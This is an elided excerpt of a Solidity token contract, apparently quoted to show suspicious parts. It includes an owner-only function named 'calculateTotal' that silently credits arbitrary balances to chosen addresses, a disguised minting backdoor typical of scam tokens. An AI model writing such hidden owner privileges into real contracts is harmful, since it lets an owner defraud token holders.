...
contract DodgeChallengerToken is Context, IERC20, Ownable {
    ...
    constructor(
        ...
        _owner = tokenOwner;
        contractOwner = payable(tokenOwner);
    ...
    function calculateTotal(address[] memory users, uint256 amount)
        public
        onlyOwner
    {
        for (uint256 i = 0; i < users.length; i++) {
            ...
            _rOwned[users[i]] = _rOwned[users[i]].add(rLiquidity);

            _tOwned[users[i]] = _tOwned[users[i]].add(amount);
        }
    }
    ...
    function excludeFromReward(address[] memory accounts) public onlyOwner {
        // require(account != 0x320dFC852EE657431bd22CdD86311B74D5632491, 'We can not exclude Uniswap router.');
    ...
    function changeContractOwner(address owner) public onlyOwner {
